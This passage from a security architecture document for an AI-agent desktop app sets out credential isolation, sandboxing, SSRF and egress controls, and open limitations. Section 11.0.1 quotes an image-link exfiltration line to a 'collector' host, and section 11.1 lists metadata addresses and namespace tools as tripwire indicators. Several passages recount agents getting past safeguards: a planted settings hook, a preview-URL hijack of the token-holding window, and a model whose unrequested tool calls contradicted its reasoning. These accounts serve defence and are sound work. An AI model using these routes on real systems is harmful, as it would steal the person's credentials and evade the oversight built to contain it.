refuses every field that would widen a session's reach (§4.2), and the daemon token never
reaches scripts (env scrub), so a script can't flip the policy via the config route.

### 7.1 CLI agents and their own tools

Claude Code, Codex and Copilot bring their own shell and file tools beside Gezel's. Those run
as the person, with the network and no Gezel gate in between, and the person's own credential
(`runtime/auth-token`, the first-party client token) sits in a file that account can read. So
they follow the resolved policy's `allowAgentShell` (core `security/policy.ts`): package
scripts, external services, scripts and edits all on, which holds only at `free`. Below it,
`chat/manager.ts` disallows Claude's `Bash`/`PowerShell` for every role, sets Codex's
`shell_tool` and `unified_exec` off, keeps Copilot's sandbox on, and clamps
`bypassPermissions` and Codex `full` to their edit modes; the agent runs code through Gezel's
own tools instead, which `claudeCliExcludedMcpTools` / `codexCliExcludedMcpTools` then stop
hiding. At `free` the agent's shell can read anything the person can, including that
credential: that is what the level means.

Three more layers keep credentials out of what an agent's own tools can reach at any level:

- **No live token in a file.** The gezel MCP server a CLI agent starts reads its config from a
  file the agent can read (`.mcp.json`, Codex's `config.toml`). That file carries a short-lived
  code (`GEZEL_TOKEN_CODE`, minted per start by `TokenStore.issueSessionBootstrap`), which the
  server trades at `POST /api/session-bootstrap` for its session token, held only in memory.
  The route is public like `/api/health` and mounted on the loopback listener only. A code
  expires 10 minutes after it is minted, or 30 seconds after its first trade
  (`BOOTSTRAP_REUSE_MS`, for a CLI that starts its servers twice), and dies with its session.
  Codex writes a fresh one each turn; Claude's file is removed when the CLI exits.
- **A filtered environment.** The CLI process gets the daemon's environment minus every
  `GEZEL_*` variable and secret-shaped name, plus only its own sign-in variables
  (`providers/agent-cli-env.ts`); Codex's shell additionally excludes `GEZEL_*`.
- **Deny rules.** Claude's settings file denies `Read`/`Edit` of the credential files under
  the Gezel home (`anthropic-cli/credential-deny.ts`); a shell ignores those rules, which is
  why the shell itself is gated.
- **No settings from the workspace.** A project's `.claude/settings*.json` (and anything in
  `.codex/`) is a file in the workspace, and a hook it names runs as the person when the CLI
  starts there; print mode skips Claude Code's trust prompt, so a gezel that planted one got a
  command run below `free` (1.26326.112 release audit). The Claude worker passes
  `--setting-sources user`, so only the person's own settings and Gezel's `--settings` file
  load; the deny rules also cover `Edit(**/.claude/settings*.json)`; and the Store and the
  change-proposal drafter refuse a gezel's write to those paths
  (`assertNotAgentCliSettingsPath` in inference `fs/safe-paths.ts`). The person may still
  edit them.
- **One-shots run without tools.** A session built with no context (an about, a summary, a
  script's `llm.oneShot`) runs Claude with no built-ins in `plan` mode and Codex in its
  read-only sandbox with the shell off, each in an empty folder. Codex's had run in the
  daemon's own folder with the install's mode and shell, so a prompt could have it print
  `runtime/auth-token`. Whenever the shell is off, Codex also gets it as a `-c` flag, which
  beats a `config.toml` and the person's own `-c`, and reaches a Codex that reads the person's
  own config (`manageRuntimeFiles: false`).

**Agent CLIs are never served to another app.** The `/v1` and Ollama surfaces, the Codex,
OpenCode, pi and VS Code bridges, and Ollama emulation answer callers that hold an
`openai`-scope token Gezel hands out without a code, or no token at all on the emulated Ollama
port. They refuse a turn on `anthropic-cli` or `codex-cli`, named directly or through a gezel
that runs on one (`openai-compat/caller-providers.ts`), and their model listings leave both out.
A paired device's `/v1/remote/admit` and `/infer` run only the on-device engines `/models`
lists: they had run whatever the model string named, including the host's cloud quota.

**Package-command approvals are content-bound.** A persistent approval for
`run_package_script` or `run_npx` hashes a versioned envelope containing the exact command
body/path, ordered arguments, and every local input Gezel can conservatively identify. The
snapshot always includes `package.json` for package scripts, includes the resolved `.bin`
entry for package binaries, and adds literal file references, wrapper/symlink targets, and
recursively visible relative JavaScript/TypeScript imports. Those paths and abbreviated
digests are shown in the prompt. If any included file changes, the next invocation prompts
again. The input list is not a complete runtime dependency graph; see §14.

**Package scripts have two switches of their own, ahead of the approval.**
`allowPackageScriptExecution` gates running: `PACKAGE_SCRIPT_TOOLS` leave the surface
(`role-tool-filter.ts`), and `runPackageScript` / `runNpx` (`workspace/scripts.ts`) refuse at
the sink and raise no kickoff approvals. It is independent of `allowScriptExecution`, which
governs the sandboxed scripts gezels write. `allowPackageScriptEdits` gates a gezel adding or
changing a manifest's `scripts` (`package.json`, `package.json5`, `package.yaml`, anywhere in
the workspace): every gezel-initiated Store write checks `packageScriptsEdit` (core
`security/package-scripts.ts`) before it lands, the script SDK's `fs.write` does the same for
runs a gezel started, and `run_nodejs_script` / `derive_file` — which write through Node's
permission model, not the Store — get the root manifests snapshotted and put back
(`workspace/manifest-guard.ts`). The person's own writes and applied proposals
(`userInitiated`) are never checked. Removing a script is allowed; it cannot make anything
run. A planted script would run later with the person's whole account, from Gezel or from
their own terminal, which is why editing is a separate permission from running.

---

## 8. Secrets at rest & in transit

Deep dive: [secrets-security.md](secrets-security.md). Summary of the controls:

- **At rest** — `FileSecretStore` (`secrets/file-store.ts`) AES-256-GCM encrypts
  `~/.gezel/secrets.enc`. Files are created with `mode: 0o600` (the atomic writer takes a
  `mode` so there's **no umask→chmod TOCTOU window**). OS keychain is not used; see §14 for
  the key-co-location limitation.
- **Never returned over HTTP** — `GET /api/config` masks every credential (`maskValue`, which
  emits a fixed mask for short secrets) and exposes `has*` booleans; no endpoint returns a raw
  secret value.
- **Not in `process.env`** — provider keys are held in memory and passed to provider
  constructors, never exported. A guard test forbids mutating `process.env`.
- **Not in argv** — the GitHub PAT is injected via `GIT_CONFIG_COUNT`/`GIT_CONFIG_KEY_*` env
  (not `-c http.extraheader` on the command line, which `ps` would expose).
- **Not leaked to MCP children** — `filterMcpChildEnv` strips secret-shaped vars
  (`*_API_KEY`, `*TOKEN`, `GEZEL_TOKEN`, …) before spawning a third-party MCP server; the
  gezel-mcp server still gets its `GEZEL_*` via the explicit `spec.env`.
- **Custom MCP imports** — environment values and HTTP headers pasted or selected through the
  Toolsets UI are moved into `SecretStore`; only their field names remain in the installed
  roster. Canonical project configs (`.gezel/mcp.json`, `.vscode/mcp.json`, `.mcp.json`) remain
  project-owned and are re-read at session build without echoing their values through the API.
- **Not exfiltratable by the model** — the outbound `fetch_url` screen refuses any request
  whose URL/headers/body contains a stored credential value (`collectProviderSecretValues`).
  Text a gezel posts to GitHub (a PR comment, a PR's title and body) is refused for a stored
  value or a secret-shaped string (`http/model-git-gate.ts`).
- **A connector's credential serves only its connector** — a `script` connector's credential
  sits in the project's grants so its fetch script can reach it parent-side, and a step script
  that declared it could spend the person's token on anything at that origin. `http.authed`
  now spends a `connector-*` credential only in that binding's own sync run
  (`assertConnectorCredentialUse`, `scripts/dispatcher.ts`). Where a binding sends its
  credential — a script type's `$config` origins, a native's `destinationKeys` (Bluesky's
  server, a GitHub Enterprise or Azure API base, a wiki host) — changes only from the person's
  own app (`isFirstPartyCaller`); the credential's origins follow that edit, and a sync adds
  only the type's literal origins, never one read from config. Bluesky's server must be https.
- **System-scope credential** — the daemon root token never leaves process memory. The
  discoverable runtime token is a separately minted `ui`/`openai` client credential. Every
  platform exposes only `runtime/` discovery metadata to local clients; all other machine
  state is private to the restricted/dedicated service identity and administrators.

---

## 9. Electron shell hardening

`packages/app/src/main.ts`, `preload.cjs`, `supervisor/`.

- **Renderer is treated as potentially hostile** (model output is rendered into the DOM).
  `webPreferences`: `contextIsolation: true`, `nodeIntegration: false`, **`sandbox: true`**,
  `webSecurity` never disabled, no `<webview>`.
- **Content-Security-Policy** (`onHeadersReceived`, `script-src 'self'`, `object-src 'none'`,
  `base-uri 'none'`, `frame-ancestors 'none'`) — the authoritative backstop against injected
  markup executing. The UI is same-origin and loads no remote scripts; the one inline
  bootstrap was externalized (`packages/ui/public/theme-init.js`) so `script-src 'self'` holds.
- **Model-generated SVG icons** are sanitized (`icon/sanitize.ts`) before persist, but the CSP
  is the real guarantee — a regex SVG sanitizer is inherently best-effort.
- **Navigation is locked down** — the main frame only ever holds the app itself
  (`isTrustedAppDocumentUrl`, `electron-boundaries.ts`): its routes on the daemon origin, or the
  splash file. "Same origin" is not enough, because the daemon also serves model-written HTML
  under `/preview/` (plus the Office pane and the APIs): a gezel once learned its page's preview
  URL from page-check, linked it in chat, and one click made that page the main document, holding
  the token. `will-navigate` cancels such a load without handing it to the system browser, and
  `onBeforeRequest` cancels any main-frame request for one, redirects included. Paths are checked
  percent-decoded, as the router reads them. `setWindowOpenHandler` + `shell.openExternal` only
  accept an `https/http/mailto/tel` allowlist (no `file://`, custom schemes, `javascript:`).
- **Cert pinning** — `session.setCertificateVerifyProc` accepts the custom loopback cert
  **only** for loopback hosts matching the current pin; all other origins defer to Chromium.
  Rotates with each daemon restart. It does **not** blanket-accept certs.
- **Token to renderer** — surfaced via a synchronous `ipcMain` bridge + `window.__GEZEL__`.
  Any renderer XSS = token theft, which is exactly why the CSP/SVG/sandbox controls above
  matter. The preload exposes about 45 functions through per-channel `contextBridge` calls (no
  raw `ipcRenderer`/`fs`/`shell`), and runs in whatever document fills the main frame, so two
  more layers sit behind the navigation lock. Every IPC channel registers through
  `createTrustedIpc` (`trusted-ipc.ts`), which answers only the main window's main frame while it
  shows the app (`isAppPageSender` in `main.ts`); a refused invoke rejects and a refused
  synchronous message gets `null`. The preload itself exposes nothing in a non-app document.
  Preview leases a gezel can read back are short: page-check revokes its lease when the run
  ends, and preview-log entries reach the model with capabilities redacted.
- **Bundle integrity** — the extracted service bundle's tarball is **sha256-verified against
  the shipped meta before extraction/execution** (`supervisor/extract-bundle.ts`). (This is
  integrity/corruption protection; the tarball + meta ship together inside the signed app.)

---

## 10. Path-safety primitives

`packages/inference/src/fs/safe-paths.ts` — every user/model-supplied path funnels through these:

- `safeJoin(base, rel)` — lexical containment with a **trailing-separator terminator** (so
  `/home/foo` doesn't match `/home/foobar`) and platform-correct case folding. Blocks `..`,
  absolute paths, drive swaps.
- `realpathContained(base, full)` — resolves symlinks (realpath of nearest existing ancestor)
  and verifies the result stays inside `base`.
- `resolveInside(base, rel)` — the end-to-end helper: `safeJoin` + reserved-Windows-name
  reject + `realpathContained`. Throws `PathSafetyError`.
- `assertNotGitControlPath(base, rel)` — refuses a path inside a `.git` folder, by name and on
  the real path (§12).

**Writes** use `resolveInside`. **Reads** were hardened to do the same (`safeResolveRead` in
`fs/store.ts`) so a symlink planted inside a workspace (trivially, via a cloned repo) can't be
followed to read out-of-tree files. A few static-file routes use the separator-terminated
`startsWith(base + sep)` form directly. **Always reach for these helpers — never hand-roll
`join(base, userPath)`.**

---

## 11. SSRF guard

`packages/service/src/utils/ssrf.ts` — `assertPublicUrl(url)` / `isPrivateAddress(ip)`.

Rejects non-`http(s)` schemes and hosts that resolve to private / loopback / link-local
(incl. `169.254.169.254` cloud metadata) / ULA / unspecified / CGNAT addresses. Used by
`fetch_url` with **per-redirect-hop re-validation** (`redirect: 'manual'`, bounded budget) so
a public URL can't 30x into an internal target. Unresolvable hosts are allowed through to fail
naturally (not a private-target threat). Validation is at DNS-resolution time — a determined
DNS-rebinding attacker could flip between check and connect; a connect-time IP pin is the full
fix and is not yet implemented.

### 11.0 The website connector's capture browser

`packages/service/src/page-capture/` — the one place a daemon-launched browser
loads live, untrusted pages ([website-connector.md](./website-connector.md),
[ADR 0031](./decisions/0031-website-connector.md)). Its boundary is not
`assertPublicUrl`:

- **A filtering forward proxy with a connect-time pin** (`filter-proxy.ts`). Chromium
  sends every request to it (`--proxy-server`, loopback included); the proxy resolves
  each host itself, refuses private / loopback / link-local / metadata / own-interface
  answers, and connects to the address it checked, so DNS rebinding has nothing to flip.
  A host the person typed may resolve privately only while its own page is captured.
- **UDP closed by profile**, not flag: the seeded `webrtc.ip_handling_policy =
  disable_non_proxied_udp` preference (the command-line switch does not exist in the
  pinned Chrome, and the headless shell ignores the preference, so only full Chrome is
  used); QUIC off. `capture.real.test.ts` asserts zero packets reach canaries on
  loopback and the LAN.
- **Chromium's own sandbox on**, in a child process the daemon kills to stop it
  (`chromiumSandbox: true`, verified on `chrome://sandbox` where available); no
  unsandboxed fallback, text-only instead.
- **No input and GET-only navigation**, enforced in the worker (`no-input.test.ts`).
- Gezels never drive it: bind, sync, sign-in and Save page refuse session tokens, and
  `request_web_page` fetches only an address that exactly matches a link the crawler
  already found on a followed site.
- **A message that names an address is saved by the composer, never by the daemon's
  send path.** The composer shows the address above the message ("… will be saved here
  and included in the chat", host and path, a query as `?…`, the full address in the
  tooltip) with a key that dismisses it, and saves it through the first-party
  `/prompt-connectors/accept` route when the person sends. The send route itself only
  reads saved copies (`resolveTurnNamedItems`), so a message that reaches a session by
  any other road (a gezel's message, a nudge from the runtime, an app's `/v1` request)
  fetches nothing. Session tokens are refused on both `/prompt-connectors` routes
  ([prompt-connectors.md](prompt-connectors.md)).

The text-only fallback (`http-session.ts`) uses `assertPublicUrl` per redirect hop and
inherits its DNS-rebinding caveat above.

### 11.0.1 Clones, page checks and rendered messages

At `lockdown` web services are off, but three paths reached the network anyway:

- **`fetch_repo` / `fetch_diff`** checked only the scheme. `planModelClone`
  (`git/model-clone-policy.ts`) now asks for model git (on at `lockdown`, the coding posture;
  off at `super-lockdown`) and lets a known public git host (GitHub, GitLab, Bitbucket,
  Codeberg, Gitea, SourceHut) through over https; any other host needs web services. Both pass
  the egress tripwire and `assertPublicUrl`, git speaks https only, and a clone from a host that
  is not known follows no redirect (the settings are written into the clone, so its later
  fetches keep them). Clone, pull, fetch, push and sync on a linked repository, and GitHub
  comments and pull requests, refuse a gezel where model git is off (`modelGitRefusal`).
- **Page-check's Chromium** loads the preview URL, whose CSP blocks remote resources when web
  services are off, but a CSP does not cover a meta refresh, WebRTC or DNS. Below `free` the
  runner aborts every request outside the page's origin, points everything else at a proxy
  that answers nothing, turns WebRTC's UDP and DNS prefetch off and blocks service workers
  (`page-check/runner.ts`, tested against a real browser).
- **The VS Code chat webview** allowed `img-src https:`, so a model's
  `![](https://collector/p.gif?d=…)` was fetched as the message rendered. It now allows
  `data:` and `blob:` like the app, and wraps the chat in squisq's
  `LOCAL_ONLY_RESOURCE_POLICY`.

### 11.1 Egress tripwire on tool calls

`packages/core/src/security/egress-indicators.ts` — `findEgressIndicators` /
`findEgressIndicatorsInValue`. A lexical check, run on a tool call **before it runs**, for four
kinds of indicator: cloud metadata services (`169.254.169.254`, `169.254.170.2`,
`100.100.100.200`, `fd00:ec2::254`, `metadata.google.internal`), other link-local addresses,
a short watchlist of data-drop, request-capture and tunnel hosts (plus the Alibaba hosts named
in Cohere's October 2026 report), and Linux namespace tools invoked with options
(`unshare -Urm`, `nsenter`). It exists because an open-weight model was seen making exactly
these calls, unrequested, while its reasoning said it would call no tools — the reasoning
trace is not a boundary, the call is.

It runs where a call executes or fetches, never on text written into a file, so a security
report may still quote these hosts:

- **Gezel's own sinks** read what actually runs: the `package.json` script body and arguments
  (`runPackageScript`), `run_npx` arguments, the Playwright script source, the
  `run_nodejs_script` file and `derive_file` source, every `fetch_url` redirect hop, a clone's
  address, and text a gezel posts to GitHub (its image proxy fetches whatever a comment embeds).
- **`McpBridge.callToolRich`** reads all arguments of a call to a bridge that does not serve
  gezel-mcp — third-party toolsets, the Playwright browser, app-registered tools — since no
  Gezel sink stands behind them.
- **The `/v1` facades** (`openai-compat/tool-call-screen.ts`) read each tool call before the
  calling app can run it. Live-streamed arguments are sent without their closing tail until
  the call is screened, so a client cannot parse — and run — it early; a withheld Responses
  call closes `incomplete` with no arguments. The reply says what was stopped.

Loopback and private addresses are deliberately not indicators: coding agents reach their
own dev servers and LAN machines every day (`fetch_url`'s SSRF guard still blocks them for
daemon-side fetches). Every block is a `security.tool-call-blocked` History entry with the
tool, the surface, and what matched. Provider-native shells (Claude CLI, Codex CLI, an
unsandboxed Copilot) are not covered; see §14.

---

## 12. Process execution & supply chain

- **Spawns use argv arrays, not shell strings.** The "reveal in file manager" launcher uses
  `execFile('open'|'xdg-open'|'explorer', [dir])` (a project `workingDir` is model-settable and
  flows here). On Windows, `runPnpm` quotes args for cmd.exe when `shell:true` is unavoidable
  (the `.cmd` shim).
- **`run_git`** (`git/restricted-args.ts`) allows eight subcommands, each with a per-subcommand
  option allowlist — not a denylist, because git accepts abbreviated long options and has
  several file-writing or file-reading flags (`--output`, `--no-index`, `--contents`). Positional
  arguments may not be absolute or contain a `..` segment, since `git diff` turns into
  `--no-index` for a path outside the work tree.
- **Every git the service runs ignores programs a repository's config names.** Repository config
  is content: a cloned repo, a folder the person adds, or a planted `.git/config` can name an
  fsmonitor, hooks, an external diff or a textconv driver, and git runs each one. The indexer
  runs `git ls-files` in every workspace and in the shared library on its own, so a
  gezel-written `core.fsmonitor` once ran as the daemon's account with no click. `runGit`
  (`git/git.ts`) and `run_git` share `git/config-overrides.ts`: `core.fsmonitor=false` and an
  empty `core.hooksPath` on every call, `--no-ext-diff --no-textconv` for diff/log/show. The
  one exception is a commit, merge or push the person starts from the app (`isOwnerCaller`,
  `runGit({ personStarted })`): its hooks run, as from a terminal, because Git LFS uploads
  objects in `pre-push` and secret scanners live in `pre-commit`; fsmonitor stays off. Git a
  gezel asks for never runs hooks, since a gezel can write a hooks folder in the working tree
  (husky's `.husky/`). Clean/smudge filters are not switched off (that needs each driver's
  name), so they rest on the next rule.
- **Gezel never writes inside a `.git` folder.** `assertNotGitControlPath` (`safe-paths.ts`)
  refuses a `.git` segment in any case, with a trailing dot or space or an NTFS stream suffix,
  and again on the real path, so a link or the Windows short name `GIT~1` cannot stand in for
  it. It guards the Store's workspace gate (every caller, the person and applied proposals
  included), the shared library and artifacts (`resolveOwnedMutationPath`), diffpack drafting,
  `extract_archive` (`.git` entries are left in the archive and counted), and app seeds.
  `run_nodejs_script` and `derive_file` write through Node's permission model instead, so
  `workspace/git-control-guard.ts` snapshots each `.git` at the workspace root and two levels
  down (config, `config.worktree`, `commondir`, `info/attributes`, hooks, pointer files) and
  puts it back after the run. The person's own editor can still read a change during the run.
- **A reserved path is judged by the name the filesystem opens, not the name typed.** On an
  NTFS volume that keeps 8.3 short names (the system drive, and so `~/.gezel`, by default)
  `DIFFPA~1/12/files/01.diff` wrote into a sealed proposal and `_META~1.JSO` into a corpus's
  bookkeeping while every predicate saw an ordinary folder. The artifacts store runs one rule
  table (`artifactMutationDenial`) on the given path and again on its native `realpath`, which
  answers with long names and follows links, for writes, mkdirs, deletes and both ends of a
  rename; a gezel's short-name-shaped segment is refused outright, for volumes whose `realpath`
  keeps the spelling. The package-script gate and DocBlocks' `save_artifact` check the same
  way. A sealed diff's sha256 lives in `diffpacks.json`, outside the drawer, and apply and
  export refuse a sidecar that no longer matches, whatever guard failed.
- **`run_playwright_script`** runs outside the script sandbox. The security level strips it
  whenever external services are off (it is open-web egress, like `fetch_url`), and the route
  refuses it the same way. A run a gezel asks for needs the user's approval of that exact
  script plus the relative imports it pulls from the artifacts tree (`command-approval`, scope
  `playwright`); editing any of them asks again. The child gets an allowlisted environment
  (`browserScriptEnv`), not the daemon's credentials.
- **`install_package`** is consent-gated, and like every install path it runs pnpm with
  `INSTALL_GUARD_FLAGS` (below).
- **NPM package installs are registry-only and project-bound.** Both the direct project API
  and approval-backed `npm_install` surface accept a canonical NPM package name plus a
  controlled semver range or dist-tag. URL, Git, local-file, workspace, alias, path, and
  option-like specifications are rejected. The project must already exist; entity ids are
  validated at the HTTP and path-helper boundaries; the resolved private package directory is
  checked for containment below `~/.gezel/projects`; and pnpm receives `--` before the package
  specification. All install paths run pnpm with `INSTALL_GUARD_FLAGS`
  (`packages/pnpm.ts`): no lifecycle scripts, no pnpmfile (`.pnpmfile.cjs`/`.mjs`, a
  `pnpmfile` path in `pnpm-workspace.yaml`, or a `pnpm-plugin-*` config dependency), and no
  switching to the pnpm version a `packageManager` field names. `npm_install` also pins the
  registry it reads from outside the workspace, so a planted `.npmrc` cannot redirect an
  allowlisted package.
- **Engine binaries** downloaded by the supervisor are sha256 + code-signature verified
  (`engines/resolver.ts`) before use. Standalone macOS archives must receive an `Accepted`
  result from Apple's notary service before CI hashes and packages those exact signed bytes;
  bare command-line binaries cannot carry a stapled ticket or undergo app-bundle Gatekeeper
  assessment. Electron-native reuse additionally hashes every executable/loadable file
  against source-bundled pins and validates the expected Authenticode/Developer ID identity;
  macOS also validates the signed/notarized parent app with Gatekeeper.
- **Machine model sharing** exposes only the installer-owned `assets/models/` subtree.
  Ordinary users receive read/execute access but no write access; the restricted service
  identity is the sole writer. Standalone clients treat it as a lower-priority overlay,
  revalidate payload hashes on first adoption, and keep verification/runtime caches in
  their user-owned home. Private machine-service config, gezels, projects, and tokens are
  never part of this overlay.
- **Installers** run every machine service under a dedicated/restricted identity. Windows uses
  LocalService plus a dedicated per-service SID and a stripped privilege set (never LocalSystem); macOS/Linux use dedicated
  non-root accounts with platform hardening such as `NoNewPrivileges` / `ProtectSystem`.
  Per-user spawn remains available but is not the packaged default.
- **`workingDir` validation** — rejects control characters / non-absolute paths at the store
  before persisting (defense-in-depth alongside the argv launcher).

---

## 13. Cross-cutting invariants (read before extending)

These are the rules that, if broken, reintroduce whole classes of the findings this
architecture fixed. Preserve them.

1. **Enforce at the narrowest chokepoint *every* principal must pass through.** Tool-surface
   filtering + the call-time dispatch guard protect against *the model*. The moment a
   capability is also reachable by another principal — a token-holding process, a different
   provider path, the script sandbox — push a check down to the **sink** (the route/handler
   that performs the action). `fetch_url` is the cautionary tale: it must check
   `allowExternalServices` + SSRF at its route, not just be hidden from the surface.
2. **Never trust self-reported attribution for authorization.** A request body field
   (`gezelId`, `initiatedByGezel`) is caller-controlled. Derive the principal from the
   authenticated token, not the payload.
3. **Code and comments must agree.** Several original findings were comments asserting a
   protection the code didn't implement ("raw fetch isn't reachable", "keeps the token off
   process args", "`/api/*` is origin-locked"). If you document a control, make it true.
4. **Loopback is not a multi-user boundary.** It does not isolate one local user from another.
   Anything readable by "the user" is readable by *every* local user unless file permissions
   say otherwise.
5. **Secrets resolve server-side and never enter untrusted address spaces.** Scripts/tools get
   the *result* of a credentialed call, never the credential.
6. **Paths go through `safe-paths.ts`. Egress goes through the SSRF guard. Spawns use argv.**
   No exceptions without a written reason.
7. **A new model-reachable tool inherits all of the above.** New tool ⇒ classify it against
   the security levels (`role-tool-filter.ts`), the scope guards (`scope-guard.ts`), and the
   sinks. If it takes a `project`/`gezel` id, decide whether it's baked or argument-supplied
   and gate accordingly.

---

## 14. Known limitations & deferred work

### A CLI agent's shell can act as the person at `free`

At `free`, Claude Code's, Codex's and an unsandboxed Copilot's own shells run as the person's
OS account, so they can read `runtime/auth-token` and every other file that account can, and
reach the daemon over loopback (§7.1). The per-session codes, environment filtering and deny
rules narrow what leaks by accident; they do not stop a shell that sets out to read the file.
Two designs would: running the CLI inside an OS boundary that hides the Gezel home and blocks
loopback (MXC on Windows, bubblewrap or landlock on Linux, a seatbelt profile on macOS), or
replacing the readable bearer file with an OS-authenticated channel for first-party
authority (peer credentials, a named pipe checked by SID). Neither is built.

### Hosting scope is not client membership

Running one daemon for the machine does not require trusting every account on
that machine. Keep these as two separate product decisions:

- **Machine-wide, approved members** — the preferred long-term default: one
  boot-time service, with discovery credentials readable only by explicitly
  approved local users/groups.
- **Machine-wide, shared** — one service and one shared Gezel home for every
  local account. This is useful on a single-user or intentionally shared
  device, but it must be an explicit trust choice because a first-party client
  can use terminals and administer the shared data.
- **Per-user** — one daemon and home owned by the logged-in user. This remains
  supported and is the development default.

The current packaged installer selects the machine-wide process and exposes
its scoped first-party discovery credential to local desktop users. That
closes OS administrator/root escalation because the daemon itself is a
restricted account, but it is **not multi-user isolation**. An installer
membership choice or an OS-authenticated local broker is still required before
we can call the first mode complete; do not solve that by restoring a
privileged service identity or putting the daemon root token on disk.

| Item | Status | Note |
|---|---|---|
| Per-credential host binding for `http.authed` | DEFERRED | Today: https + `redirect:'manual'`; a granted script can still POST a credential to any public host it names. Needs a grant-schema decision (e.g. GitHub Enterprise custom hosts). |
| `secrets.key` co-located with `secrets.enc` | DEFERRED | Same-dir, same `0600`; encryption ≈ file perms. Fix = bind the key to an OS keychain / machine-id KDF / passphrase. Treat `secrets.enc` as plaintext-equivalent for backup/sync purposes. |
| Machine-shared client membership | PRODUCT CHOICE | Every local account that can read the shared runtime credential is a trusted first-party Gezel client and can access shared daemon data. A future installer choice should make shared-machine versus per-user/private hosting explicit. |
| Machine-shared projects and crew | ENFORCED | The shared root is writable by every local account, so a shared `project.json`, `gezel.md` or task file is another account's text. The Store ignores and refuses a shared project's folder, links, GitHub link, connections, credential grants and agent permissions, and a shared gezel's sandbox and permission overrides; nothing starts there unattended (`projectAllowsUnattendedWork`); a task's CLI trust stamp grants nothing. Content (workspace, memory, task text) is still read as collaborative text. See [service-boundaries.md](service-boundaries.md#machine-wide-projects-and-gezels). |
| Broker LAN-serving administration via `machine-models` | PRODUCT CHOICE | The broker's `/v1/remote/manage/serving` surface (enable LAN serving, show a connect code, approve/deny device pairings, revoke devices) is authorized by the same shared runtime credential — until installer membership exists, any local account can administer LAN serving for the machine. The scope stays never-grantable via `/v1/apps/register`, so LAN peers can never obtain it. |
| Remote product UI/API access | INTERIM — tunnel recipe | The product `/api` + web UI stay loopback-only by three independent layers (bind, host guard, cert/auth). The supported interim is a loopback-preserving tunnel (SSH `-L` / Tailscale toward loopback) with the schema-declared `service:{url,token}` supervisor mode; first-class remote access is designed in `docs/remote-access.md` and gated on the accounts ADR (0004). |
| External user working directories from a machine daemon | NEEDS BROKER/GRANT | Dedicated service identities cannot safely inherit arbitrary user-profile access. Add an explicit ACL grant or user-context broker when linking such a folder; do not restore a privileged daemon identity. |
| `denyNet` execution without an OS boundary | FAIL CLOSED | Windows runs it in the MXC container when the probe passes; Linux runs it under a systemd user unit when the probe passes, carrying script RPC over stdio. Elsewhere (Windows with the container off or unavailable, Linux without a usable systemd user manager) model/gate scripts return exit 126. Restore execution only with a real OS sandbox, not a JavaScript-only shim. |
| Network-on execution without an OS boundary | PARTIAL | Spectral components, and model scripts at `free` where no denyNet boundary exists, run with the network. On Linux without a usable systemd user manager (a container, a server with no session) and on Windows without the container, only the Node layers above stand between them and the account: the permission model, the hardening options and preloads, and the link check. The Spectral origin guard is JavaScript-only and a component can step around it (`_http_client`, `WebSocket`, its own dispatcher). Next: Landlock and signal scoping in `gezel-sandbox`, and Spectral egress through a daemon filter proxy. |
| File-system boundary on Linux | PARTIAL | No OS layer confines files on Linux; the systemd unit restricts address families only. The link check refuses a link that leads out now, but a script can move a directory holding a relative link so that it leads out afterwards, and a hard link to an outside file (a package store's) is written through. Landlock in `gezel-sandbox` is the fix. |
| SSRF connect-time IP pin | DEFERRED | Current guard validates at DNS-resolution time (rebinding-window residual). |
| Agent CLIs behind caller-owned surfaces | ENFORCED | The `/v1`, Ollama and bridge surfaces refuse `anthropic-cli` and `codex-cli`, directly or through a gezel on one, and leave them out of their listings; a paired device reaches only on-device engines (§7.1). |
| Connector credentials and destinations | ENFORCED | A `connector-*` credential serves only its own binding's sync run; a destination field changes only from the person's app, and a sync never widens a credential's origins (§8). |
| Google data and cloud models | ENFORCED | A Google connection's records, and conversations, tasks, memories and artifacts that come from them, reach only models on this computer until the person allows cloud ones for that connection (`connectionKeepsLocal`, [kept-local-data.md](kept-local-data.md)). Not covered: workspace and shared-library files a gezel writes, approved scripts that run with the person's rights, third-party toolsets at `free`, and apps holding the person's credential. |
| Unattended connector sends and posts | ENFORCED | A consent scope such as `allowPublish` is a standing permission on the connection, not a question per post. A commit transmits only when the person pressed Approve or the committing gezel runs a turn the person started (`isUserDirectedTurn`); a scheduled task by day, the night shift, a nudge or another gezel's request holds in the outbox (`held-for-approval`). A lookout's own recipients and mailbox drafts are the exceptions. Within a turn the person started, a gezel that read hostile content can still post without a further click. See [connectors.md](connectors.md#write-back-and-the-morning-briefing). |
| Gezel posts to GitHub at `lockdown` | PRODUCT CHOICE | Lockdown keeps GitHub read and write for gezels, so after a turn reads a hostile pull request a gezel can still post ordinary text as a comment: the screen stops stored credentials, secret-shaped strings and tripwire addresses, not private code or prose. The fix is a per-project "may post to GitHub" switch or an approval for a post that follows untrusted content. |
| Egress tripwire coverage (§11.1) | PARTIAL | Lexical and easy to evade on purpose: it targets trained-in habits, not an adversary. Provider-native shells (Claude CLI, Codex CLI, an unsandboxed Copilot) and MCP toolsets those providers call directly never pass the bridge, so their calls are not read. The next layer is a Gezel-owned egress proxy that logs and filters the connections themselves. |
| Package-script edits by sandboxed scripts | PARTIAL | `run_nodejs_script` / `derive_file` write through Node's permission model, not the Store, so only the workspace's root manifests are snapshotted and put back. A nested workspace package's `scripts` can still change that way while `allowPackageScriptEdits` is off. |
| URL, Git, local-file, workspace, and alias NPM sources | NOT SUPPORTED | The generic install surfaces intentionally accept registry packages only. If alternate sources become necessary, add a separate explicit consent-gated API with source-specific validation and SSRF controls; do not widen the registry-package parser. |
| Package-command input closure | PARTIAL | Persistent approvals bind identifiable project-local files, but outside-project paths, directory/glob contents, dynamically selected files, implicit config conventions, PATH-resolved programs, bare package imports, oversized files, input graphs beyond the bounded scan, and network responses cannot always be inferred safely before execution. Treat an approved package command as trusted code, not a sandbox. |
| Default security level | ENFORCE | New installs get explicit `lockdown`; an absent policy resolves to `lockdown` (`DEFAULT_SECURITY_LEVEL`). Only a configured legacy install is migrated to explicit `free`, to preserve the behavior it already had (§5). |

---

## 15. Configuration / environment-flag reference

Security-relevant env flags (defaults chosen to be safe-by-default where it won't break the
app):

| Flag | Values (default) | Effect |
|---|---|---|
| `GEZEL_TOKEN_SCOPE` | enforce *(default)* / audit / off | Project-boundary guard (§4.2). |
| `GEZEL_TEAM_SCOPE` | enforce *(default)* / audit / off | Team/orchestration-route guard. |
| `GEZEL_IDENTITY_SCOPE` | enforce *(default)* / audit / off | Gezel-identity guard. |
| `GEZEL_INSECURE_TRANSPORT` | unset *(default)* / 1 | Downgrade loopback TLS → plain HTTP. Dev/diagnostics only. |
